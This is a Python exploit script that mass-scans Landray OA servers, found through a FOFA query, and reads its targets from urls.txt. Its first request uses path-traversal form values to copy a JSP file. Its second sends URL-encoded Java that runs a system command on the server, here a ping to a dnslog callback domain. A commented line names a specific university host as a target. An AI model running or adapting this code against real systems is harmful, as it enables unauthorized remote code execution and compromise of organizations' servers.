import requests
import warnings
from concurrent.futures import ThreadPoolExecutor

#fofa  app="Landray-OA系统"
warnings.filterwarnings("ignore")

def poc(u):
    url = f"{u}/sys/ui/sys_ui_component/sysUiComponent.do"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryL7ILSpOdIhIIvL51",
        "X-Requested-With": "XMLHttpRequest"
    }
    data = (
        '------WebKitFormBoundaryL7ILSpOdIhIIvL51\r\n'
        'Content-Disposition: form-data; name="method"\r\n\r\n'
        'replaceExtend\r\n'
        '------WebKitFormBoundaryL7ILSpOdIhIIvL51\r\n'
        'Content-Disposition: form-data; name="extendId"\r\n\r\n'
        '../../../../resource/help/km/review/\r\n'
        '------WebKitFormBoundaryL7ILSpOdIhIIvL51\r\n'
        'Content-Disposition: form-data; name="folderName"\r\n\r\n'
        '../../../ekp/sys/common\r\n'
        '------WebKitFormBoundaryL7ILSpOdIhIIvL51--\r\n'
    )
    proxies = {
    'http':'http://127.0.0.1:7890',
    'socks':'socks5://127.0.0.1:7890',
    }

    response = requests.post(url, headers=headers, data=data,proxies= proxies)

    if response.status_code==200:
        if len(response.text ) <50:
            print(url,'\n',response.text)
            exp(u)

def exp(u):
    url = f"{u}/resource/help/km/review/dataxml.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"
    }

    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'https://127.0.0.1:8080',
    }
    data=(r's_bean=ruleFormulaValidate&script=%74%72%79%20%7b%53%74%72%69%6e%67%20%63%6d%64%20%3d%20%5c%22%70%69%6e%67%20%79%72%66%78%76%70%2e%64%6e%73%6c%6f%67%2e%63%6e%5c%22%3b%50%72%6f%63%65%73%73%20%63%68%69%6c%64%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%63%6d%64%29%3b%7d%20%63%61%74%63%68%20%28%49%4f%45%78%63%65%70%74%69%6f%6e%20%65%29%20%7b%53%79%73%74%65%6d%2e%65%72%72%2e%70%72%69%6e%74%6c%6e%28%65%29%3b%7d&returnType=int&modelName=test')
    response = requests.post(url, headers=headers, data=data,proxies= proxies)
    if "公式运行" in response.text:
        print(url,'\n',response.text)

# 批量检测
with open('urls.txt', 'r') as file:
    urls = [u.strip() for u in file.readlines()][200:]
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(poc, urls)



#单个检测
# poc("http://hqgl.sicp.edu.cn:8080")